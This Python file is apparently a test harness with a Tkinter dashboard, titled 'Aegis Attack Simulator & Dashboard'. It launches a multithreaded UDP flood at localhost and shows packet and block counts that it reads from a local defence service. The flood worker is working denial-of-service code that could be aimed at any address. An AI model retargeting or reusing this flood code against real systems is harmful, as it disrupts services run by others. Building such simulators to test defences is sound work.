import socket
import threading
import time
import random
import tkinter as tk
import requests

def udp_flood_worker(target_ip, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1024)
    while time.time() < timeout:
        try:
            target_port = random.randint(10000, 60000)
            sock.sendto(payload, (target_ip, target_port))
        except Exception:
            pass

def launch_attack():
    target_ip = "127.0.0.1"
    thread_count = 15
    duration_seconds = 5
    active_threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=udp_flood_worker, args=(target_ip, duration_seconds))
        t.daemon = True
        t.start()
        active_threads.append(t)

def fetch_data():
    try:
        res = requests.get("http://127.0.0.1:8000/system_status").json()
        label_p.config(text="Packets: " + str(res["packets_analyzed"]))
        label_b.config(text="Blocks: " + str(res["active_blocks"]))
    except Exception:
        pass
    root.after(200, fetch_data)

root = tk.Tk()
root.title("Aegis Attack Simulator & Dashboard")
root.geometry("500x400")
root.configure(bg="#121212")

label_p = tk.Label(root, text="Packets: 0", fg="#ffffff", bg="#121212", font=("Arial", 30))
label_p.pack(pady=20)

label_b = tk.Label(root, text="Blocks: 0", fg="#ff0000", bg="#121212", font=("Arial", 30))
label_b.pack(pady=20)

attack_btn = tk.Button(root, text="LAUNCH VOLUMETRIC ATTACK", bg="#ff0000", fg="#ffffff", font=("Arial", 16), command=lambda: threading.Thread(target=launch_attack).start())
attack_btn.pack(pady=40)

fetch_data()
root.mainloop()